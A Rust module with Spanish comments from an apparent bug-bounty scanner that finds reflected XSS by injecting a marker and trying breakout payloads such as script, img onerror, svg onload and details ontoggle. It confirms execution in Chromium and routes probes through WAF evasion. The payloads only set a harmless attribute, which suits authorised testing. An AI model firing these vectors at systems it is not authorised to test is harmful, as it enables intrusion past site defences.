// SPDX-License-Identifier: LicenseRef-Propietario
//! BUCLE ADAPTATIVO DE XSS (arnm) — señal-de-reflejo → variante → oráculo de EJECUCIÓN → memoria.
//!
//! Comparte el mismo diseño que `autenticacion::ciclo_auth` y el mismo substrato (`secuencias`),
//! pero su familia es XSS. El ORÁCULO ya existe y es limpio: `browser::confirm`ación por
//! ejecución en Chromium real (no match de string — ese era el FP #11). Lo que este módulo
//! añade es el ARNm: en vez de disparar un solo `<script>` canónico (que todo WAF bloquea),
//! TRANSCRIBE el mismo JS de prueba a múltiples VECTORES (img/svg/onload/ontoggle…), y solo
//! confirma con el navegador —lo caro— donde una SEÑAL barata (reflejo del marcador) dice que
//! hay sink. Sin reflejo, 0 llamadas a Chromium: la respuesta a la inquietud del desgaste.
//!
//! Estatuto detector: el payload solo PRUEBA ejecución (pone un atributo-testigo); no roba
//! cookies, no persiste, no navega. GET no destructivo, in-scope. Se reporta, no se explota.

use std::collections::BTreeMap;

use crate::browser;
use crate::config::Config;
use crate::secuencias::{self, Mutacion, OraculoConfirmado, PosturaDefensa};

/// La clave de familia bajo la que XSS siembra su memoria en `secuencias`.
pub const FAMILIA_XSS: &str = "xss";

/// La SEÑAL barata (sin navegador) que decide si vale la pena confirmar: ¿se refleja en el
/// cuerpo un marcador benigno inyectado? Reflejado = hay sink (transcribir); sin reflejo =
/// sin sink (podar, 0 Chromium).
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum SenalXss {
    Reflejado,
    SinReflejo,
}

/// Clasifica la reflexión. Puro (dir. 33: su pareja es el test).
pub fn clasificar_reflejo(body: &str, marca: &str) -> SenalXss {
    if body.contains(marca) {
        SenalXss::Reflejado
    } else {
        SenalXss::SinReflejo
    }
}

/// TRANSCRIBE los VECTORES de ejecución (moldes) a payloads concretos que llevan el MISMO JS
/// de prueba. Un WAF que bloquea `<script>` no bloquea `onerror`/`onload`/`ontoggle`: por eso
/// son variantes de la misma intención. Los templates XSS de nuclei entran aquí como moldes.
/// Puro y determinista.
pub fn transcribir_xss(nonce: u64, moldes_nuclei: &[String]) -> Vec<(String, String)> {
    let (js, _) = browser::canary_js(nonce);
    // Breakout multi-contexto (cierra atributo/título/textarea/estilo/script) antes del vector.
    let brk = "'\"></title></textarea></style></noscript></script>";
    let mut out = vec![
        ("script".into(), format!("{brk}<script>{js}</script>")),
        ("img-onerror".into(), format!("{brk}<img src=x onerror=\"{js}\">")),
        ("svg-onload".into(), format!("{brk}<svg onload=\"{js}\">")),
        ("body-onload".into(), format!("{brk}<body onload=\"{js}\">")),
        ("details-ontoggle".into(), format!("{brk}<details open ontoggle=\"{js}\">")),
        ("script-break".into(), format!("{brk}<script/x>{js}</script>")),
    ];
    // MOLDES DE NUCLEI (la inversión): su breakout, NUESTRO JS. El placeholder se rellena con
    // el mismo `js` de prueba, así el oráculo de ejecución confirma cualquiera igual. Van con
    // su propio breakout previo por si el reflejo está en un contexto que el nuestro no cierra.
    for (i, m) in moldes_nuclei.iter().enumerate() {
        let cuerpo = m.replace(crate::nuclei_moldes::PLACEHOLDER_JS, &js);
        out.push((format!("nuclei/{i}"), format!("{brk}{cuerpo}")));
    }
    out
}

/// El hallazgo confirmado por ejecución, con su evidencia mínima.
#[derive(Debug, Clone)]
pub struct HallazgoXss {
    pub vector: String,
    pub payload: String,
    pub url: String,
    pub ratio: String,
}

/// Resultado del ciclo adaptativo de XSS para un (host, endpoint parametrizado).
#[derive(Debug, Clone)]
pub struct ResultadoXss {
    pub senal: SenalXss,
    pub variantes_probadas: usize,
    pub hallazgo: Option<HallazgoXss>,
    pub desde_memoria: bool,
}

/// Confirma UN payload por ejecución REPRODUCIBLE (N-de-M) reusando el oráculo de `browser`:
/// inyecta el payload, abre Chromium, y exige que el marcador COMPUTADO aparezca en el DOM
/// (que solo ocurre si el JS corrió) y que no sea una página de error/muro.
async fn confirmar_variante(
    cfg: &Config,
    base_url: &str,
    payload: &str,
    marker: &str,
    tries: usize,
) -> (bool, String) {
    let target = browser::inject_canary(base_url, payload);
    let mut oks = 0usize;
    for _ in 0..tries {
        match browser::dump_dom(cfg, &target).await {
            Ok(dom) if browser::executed(&dom, marker) && !browser::is_error_page(&dom) => oks += 1,
            _ => {}
        }
    }
    (browser::decide(oks, tries, tries), format!("{oks}/{tries}"))
}

/// EL CICLO ADAPTATIVO DE XSS para un endpoint parametrizado: señal barata de reflejo → (si
/// hay sink) memoria → transcribir vectores → oráculo de ejecución → SIEMBRA el vector
/// ganador en `secuencias`. Sin reflejo, 0 llamadas a Chromium (poda). Devuelve qué pasó.
#[allow(clippy::too_many_arguments)]
pub async fn ciclo_xss(
    pool: &sqlx::SqlitePool,
    program: &str,
    host: &str,
    base_url: &str,
    cliente: &reqwest::Client,
    cfg: &Config,
    curl_impersonate_path: &str,
    moldes_nuclei: &[String],
    tries: usize,
    nonce_base: u64,
) -> crate::error::Result<ResultadoXss> {
    // 0) SEÑAL barata (sin navegador): inyecta un marcador benigno y mira si se refleja.
    //    Vía `fetch_evasion` para que un WAF no lo bloquee y falsee un "sin reflejo" (dir. 30).
    let marca = format!("nxr{nonce_base}");
    let probe_url = browser::inject_canary(base_url, &marca);
    let resp = crate::impersonate::fetch_evasion(cliente, &probe_url, &[], curl_impersonate_path, 12).await;
    let (status, body) = (resp.status, resp.body);
    let senal = clasificar_reflejo(&body, &marca);
    if senal == SenalXss::SinReflejo {
        // Sin sink XSS → 0 Chromium (poda). El desgaste, evitado; y jamás un FP.
        return Ok(ResultadoXss { senal, variantes_probadas: 0, hallazgo: None, desde_memoria: false });
    }

    // Huella de postura para indexar la memoria por entorno.
    let postura = PosturaDefensa {
        status_no_auth: status,
        es_challenge: false,
        familia_waf: None,
        amuralla_ip: false,
        cabeceras_seguridad: Vec::new(),
    };
    let huella = postura.huella();
    let (_js, marker) = browser::canary_js(nonce_base);

    // 1) MEMORIA primero: ¿ya sabemos qué vector ejecutó aquí?
    for sec in secuencias::recuperar(pool, host, FAMILIA_XSS, &huella).await? {
        if let Some(pl) = sec.mutacion.parametros.get("payload") {
            let (ok, ratio) = confirmar_variante(cfg, base_url, pl, &marker, tries).await;
            if ok {
                if let Some(orac) = OraculoConfirmado::desde_ejecucion(true) {
                    let _ = secuencias::guardar(
                        pool, &orac, program, host, &huella, &sec.mutacion, None, Some(&ratio),
                    )
                    .await;
                }
                let url = browser::inject_canary(base_url, pl);
                return Ok(ResultadoXss {
                    senal,
                    variantes_probadas: 1,
                    hallazgo: Some(HallazgoXss {
                        vector: sec.mutacion.tecnica.clone(),
                        payload: pl.clone(),
                        url,
                        ratio,
                    }),
                    desde_memoria: true,
                });
            }
        }
    }

    // 2) TRANSCRIBIR vectores → confirmar con Chromium, SOLO sobre el sink reflejado.
    // BARRIDO EFICIENTE: cada vector se prueba UNA vez (tries=1); solo el que ejecuta paga la
    // reproducibilidad completa (`tries`) antes de sembrar. Con ~66 vectores eso baja el coste
    // del caso sin-hallazgo de 66×tries a 66×1 cargas de Chromium (medido: 0,72s/carga → de
    // ~142s a ~48s por endpoint reflejado), sin perder el gate de reproducibilidad del ganador.
    let mut probadas = 0usize;
    for (vector, payload) in transcribir_xss(nonce_base, moldes_nuclei) {
        probadas += 1;
        let (ejecuta, _) = confirmar_variante(cfg, base_url, &payload, &marker, 1).await;
        if !ejecuta {
            continue;
        }
        // Ejecutó una vez: re-confirma con reproducibilidad completa antes de afirmar nada.
        let (ok, ratio) = confirmar_variante(cfg, base_url, &payload, &marker, tries).await;
        if ok {
            let mut params = BTreeMap::new();
            params.insert("payload".to_string(), payload.clone());
            let mutacion = Mutacion {
                familia: FAMILIA_XSS.to_string(),
                tecnica: vector.clone(),
                parametros: params,
            };
            if let Some(orac) = OraculoConfirmado::desde_ejecucion(true) {
                let _ = secuencias::guardar(
                    pool, &orac, program, host, &huella, &mutacion, None, Some(&ratio),
                )
                .await;
            }
            let url = browser::inject_canary(base_url, &payload);
            return Ok(ResultadoXss {
                senal,
                variantes_probadas: probadas,
                hallazgo: Some(HallazgoXss { vector, payload, url, ratio }),
                desde_memoria: false,
            });
        }
    }
    Ok(ResultadoXss { senal, variantes_probadas: probadas, hallazgo: None, desde_memoria: false })
}

/// LA FASE XSS ADAPTATIVA: fan-out de `ciclo_xss` sobre los endpoints PARAMETRIZADOS del
/// corpus (los únicos donde un reflejo es posible). El selector poda los que no reflejan
/// (0 Chromium); los que ejecutan una variante se persisten como hallazgo. No destructivo;
/// nunca auto-envío (estatuto detector). Devuelve cuántas XSS confirmó por ejecución.
#[allow(clippy::too_many_arguments)]
pub async fn fase_xss_adaptativa(
    pool: &sqlx::SqlitePool,
    program: &str,
    program_id: i64,
    endpoints: &[String],
    cliente: &reqwest::Client,
    cfg: &Config,
    curl_impersonate_path: &str,
    guard: &crate::protection::Guard,
    deadline: Option<std::time::Instant>,
    webhook: Option<&str>,
    tries: usize,
) -> crate::error::Result<usize> {
    // MOLDES de nuclei (la inversión), cargados UNA vez para toda la fase. Falla suave: si el
    // dir no está o va vacío, quedan los 6 vectores a mano.
    let moldes_nuclei: Vec<String> = if cfg.nuclei_templates_dir.is_empty() {
        Vec::new()
    } else {
        crate::nuclei_moldes::cargar_moldes_xss(
            std::path::Path::new(&cfg.nuclei_templates_dir),
            cfg.xss_nuclei_cap,
        )
    };
    if !moldes_nuclei.is_empty() {
        tracing::info!("xss: {} vectores de nuclei cargados como moldes (la inversión)", moldes_nuclei.len());
    }
    let mut n = 0usize;
    let mut nonce: u64 = 0x1000;
    let mut probados = 0usize;
    for ep in endpoints {
        // Superficie inyectable, el MISMO criterio que SSRF (`is_parameterizable`: `?`, `/api`,
        // `.php`…), no solo `?k=v`. Medido 2026-08-25 en ripencc: el filtro estrecho anterior
        // dejaba a arnm 0 endpoints mientras SSRF inyectaba en 30 — arnm no atacaba por un filtro
        // que le tapaba la superficie, no por su transcripción. `inject_canary` sabe inyectar en
        // query (reemplaza el último param) o en path (añade segmento), así que ambos caben.
        if !crate::enhanced::is_parameterizable(ep) {
            continue;
        }
        if crate::autz::deadline_vencido(deadline) {
            break;
        }
        if guard.should_pause() {
            tracing::warn!("xss: PAUSA por rate-limit — protejo la IP compartida");
            break;
        }
        probados += 1;
        nonce += 1;
        let host = crate::scope::host_of(ep);
        let res = ciclo_xss(pool, program, &host, ep, cliente, cfg, curl_impersonate_path, &moldes_nuclei, tries, nonce).await?;
        let Some(h) = res.hallazgo else { continue };
        let nf = crate::db::NewFinding {
            program_name: program.to_string(),
            vuln_name: "reflected-xss".to_string(),
            severity: "high".to_string(),
            url: h.url.clone(),
            cwe: Some("CWE-79".to_string()),
            evidencia: Some(format!(
                "{}: XSS reflejada CONFIRMADA POR EJECUCIÓN en Chromium (vector {}, repro {}). El marcador \
                 computado apareció en el DOM — no es match de string. Variante hallada por arnm{}. El payload \
                 de prueba solo pone un atributo-testigo (no roba nada). Confirmar y reportar.",
                h.url, h.vector, h.ratio,
                if res.desde_memoria { " (reusada de memoria)" } else { "" },
            )),
        };
        if crate::db::insert_finding_dedup(pool, &nf, program_id).await? {
            n += 1;
            tracing::warn!("xss: EJECUCIÓN confirmada en {} (vector {}, {})", h.url, h.vector, h.ratio);
            let _ = crate::notify::notificar(
                webhook,
                &crate::notify::Evento::Hallazgos(vec![crate::notify::HallazgoBreve {
                    severity: "high".to_string(),
                    vuln_type: "reflected-xss".to_string(),
                    url: h.url.clone(),
                    program_name: program.to_string(),
                }]),
            )
            .await;
        }
    }
    tracing::info!("xss: {probados} endpoint(s) parametrizado(s), {n} XSS confirmada(s) por ejecución");
    Ok(n)
}
